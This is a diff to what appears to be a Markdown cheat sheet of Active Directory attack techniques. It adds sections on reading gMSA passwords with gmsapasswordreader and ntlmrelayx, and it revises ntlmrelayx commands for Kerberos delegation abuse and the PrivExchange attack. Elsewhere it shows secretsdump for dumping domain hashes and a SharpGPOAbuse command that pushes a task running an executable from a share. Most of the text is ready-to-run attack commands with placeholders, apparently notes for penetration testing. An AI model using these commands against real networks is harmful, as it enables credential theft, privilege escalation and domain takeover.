@@ -23,6 +23,8 @@
     * [Permissions on a OU](#Permissions-on-OU)
     * [Writeowner of an object](#Writeowner-of-an-object---Change-the-owner)
     * [Owner of an object](#Owner-of-an-object---Add-GenericAll)
+    * [ReadGMSAPassword](#ReadGMSAPassword)
+      * [Relaying ReadGMSAPassword](#Relaying-ReadGMSAPassword) 
     * [NTLMRelay](#NTLMRelay)
     * [GPO Abuse](#GPO-Abuse)
 * [Delegation](#Delegation) 
@@ -527,7 +529,21 @@ Add-DomainObjectAcl -Credential $creds -TargetIdentity "<OBJECT FQDN OR SID>" -R
 Get-DomainObjectAcl -Identity "<OBJECT FQDN OR SID>" -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID OF USER WHO GETS GENERIC ALL>
 ```
 
-#### NTLMRelay
+### ReadGMSAPassword
+- https://github.com/rvazarkar/GMSAPasswordReader
+
+#### Read GMSA password
+```
+.\gmsapasswordreader.exe --accountname <ACCOUNT>
+```
+
+### Relaying ReadGMSAPassword
+- Can either relay to `ldap` or `ldaps`
+```
+sudo python3 ntlmrelayx.py -t ldap://<DC> --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs
+```
+
+### NTLMRelay
 - It is possible to abuse ACL with NTLMRelay abuse
 ```
 ntlmrelayx.py -t ldap://<DC IP> --escalate-user <USER>
@@ -594,6 +610,7 @@ net localgroup administrators
 ```
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c <SHARE>\<EXECUTABLE FILE>" --GPOName "<GPO>"
 ```
+
 
 ## Delegation
 - In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;
@@ -1034,8 +1051,9 @@ Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> 
 - Didn't test dnstool for this attack
 
 #### Serve image with impacket
+- Can either relay to `ldap` or `ldaps` -t ldap://<DC>
 ```
-sudo python3 ntlmrelayx.py -t ldap://<DC FQDN> --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg --http-port 8080
+sudo python3 ntlmrelayx.py -t ldap://<DC> --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg --http-port 8080
 ```
 
 #### Change lockscreen image
@@ -1222,9 +1240,9 @@ Add-DomainGroupMember -Identity $group -Members $user -Verbose
 
 #### The attack using domain credentials
 - https://github.com/dirkjanm/privexchange/
-- Attack takes a minute!
+- Can either relay to `ldap` or `ldaps`
 ```
-sudo python3 ntlmrelayx.py -t ldap://<DC FQDN> --escalate-user <USER>
+sudo python3 ntlmrelayx.py -t ldap://<DC> --escalate-user <USER>
 
 python3 privexchange.py -ah <ATTACKER HOST> <EXCHANGE SERVER> -u Username -d <DOMAIN NAME>
 
@@ -1232,8 +1250,7 @@ secretsdump.py <DOMAIN>/<USER>@<DC IP> -just-dc
 ```
 
 #### The attack without credentials
-- using LLMNR/NBNS/mitm6 spoofing and https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py first
-- Really vague described in the INE slides. Never tried it either!
+- using LLMNR/NBNS/mitm6 spoofing and https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py
 ```
 sudo python3 ntlmrelayx.py -t https://<EXCH HOST>/EWS/Exchange.asmx
 ```
